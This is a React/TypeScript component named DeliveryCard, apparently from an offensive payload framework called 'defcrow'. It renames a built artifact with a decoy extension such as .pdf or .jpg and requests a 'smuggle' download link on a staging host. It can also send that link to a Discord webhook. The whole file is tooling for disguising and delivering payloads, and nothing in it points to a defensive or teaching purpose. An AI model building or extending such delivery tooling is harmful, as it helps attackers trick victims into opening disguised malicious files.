import { useState } from 'react'
import { SmugResponse, sendDiscordWebhook } from '../api/smuggler'

const EXTENSIONS = ['.pdf', '.jpg', '.png', '.gif', '.iso', '.zip', '.svg', '.jpeg', '.exe']

interface Props {
  artifactName: string
  stageHost:    string
  downloadId:   string | null
  onSmuggle:    (fakeName: string) => Promise<SmugResponse>
}

export default function DeliveryCard({ artifactName, stageHost, downloadId, onSmuggle }: Props) {
  const [ext, setExt]                   = useState('.pdf')
  const [smugUrl, setSmugUrl]           = useState<string | null>(null)
  const [smugLoading, setSmugLoading]   = useState(false)
  const [discordSent, setDiscordSent]   = useState(false)
  const [discordError, setDiscordError] = useState(false)

  const baseName          = artifactName.replace(/\.[^.]+$/, '')
  const fakeName          = `${baseName}${ext}`
  const discordWebhookUrl = localStorage.getItem('defcrow_discord_url')

  async function handleSmuggle() {
    if (!downloadId || smugLoading) return
    setSmugLoading(true)
    try {
      const res = await onSmuggle(fakeName)
      setSmugUrl(`https://${stageHost}${res.url}`)
    } finally {
      setSmugLoading(false)
    }
  }

  async function handleDiscord() {
    if (!smugUrl || !discordWebhookUrl) return
    try {
      await sendDiscordWebhook(discordWebhookUrl, smugUrl, fakeName)
      setDiscordSent(true)
      setTimeout(() => setDiscordSent(false), 3000)
    } catch {
      setDiscordError(true)
      setTimeout(() => setDiscordError(false), 3000)
    }
  }

  return (
    <div className="rounded-xl p-4 space-y-3" style={{ border: '1px solid var(--border)', backgroundColor: 'var(--surface-2)' }}>
      <div className="text-xs font-semibold uppercase tracking-widest" style={{ color: 'var(--ink-muted)' }}>
        Delivery
      </div>

      {/* Extension picker */}
      <div className="flex flex-wrap gap-1">
        {EXTENSIONS.map(e => (
          <button
            key={e}
            type="button"
            onClick={() => setExt(e)}
            className="text-[10px] px-2 py-0.5 rounded font-mono transition"
            style={{
              border:          `1px solid ${ext === e ? 'var(--blue-500)' : 'var(--border)'}`,
              backgroundColor: ext === e ? 'var(--blue-alpha)' : 'transparent',
              color:           ext === e ? 'var(--blue-500)' : 'var(--ink-muted)',
            }}
          >
            {e}
          </button>
        ))}
      </div>

      {/* URL area — placeholder before smuggle, real link after */}
      {smugUrl ? (
        <div className="space-y-2">
          <div className="rounded-lg px-3 py-2 font-mono text-xs break-all" style={{ backgroundColor: 'var(--surface)', color: 'var(--ok)' }}>
            {smugUrl}
          </div>
          <div className="flex gap-2">
            <button
              type="button"
              onClick={() => window.open(smugUrl, '_blank')}
              className="flex-1 py-1.5 rounded-lg text-xs font-medium transition"
              style={{ border: '1px solid var(--border)', color: 'var(--ink)' }}
            >
              Open
            </button>
            <button
              type="button"
              onClick={() => navigator.clipboard?.writeText(smugUrl)}
              className="flex-1 py-1.5 rounded-lg text-xs font-medium transition"
              style={{ border: '1px solid var(--blue-500)', color: 'var(--blue-500)' }}
            >
              Copy link
            </button>
          </div>
          {discordWebhookUrl && (
            <button
              type="button"
              onClick={handleDiscord}
              disabled={discordSent}
              className="w-full py-1.5 rounded-lg text-xs font-medium transition disabled:opacity-60"
              style={{
                border: '1px solid var(--border)',
                color:  discordError ? 'var(--danger)' : discordSent ? 'var(--ok)' : 'var(--ink-muted)',
              }}
            >
              {discordSent ? 'Sent!' : discordError ? 'Failed' : 'Send to Discord'}
            </button>
          )}
        </div>
      ) : (
        <div className="rounded-lg px-3 py-2 font-mono text-xs break-all" style={{ backgroundColor: 'var(--surface)', color: 'var(--ink-muted)' }}>
          {downloadId ? `https://${stageHost}/d/…/${fakeName}` : 'Build first to create smuggle link'}
        </div>
      )}

      {/* Smuggle button — hidden once link is created */}
      {!smugUrl && (
        <button
          type="button"
          disabled={!downloadId || smugLoading}
          onClick={handleSmuggle}
          className="w-full py-2 rounded-lg text-xs font-medium transition disabled:opacity-40 disabled:cursor-not-allowed"
          style={{ backgroundColor: 'var(--blue-500)', color: '#fff' }}
        >
          {smugLoading ? 'Generating…' : 'Smuggle'}
        </button>
      )}
    </div>
  )
}
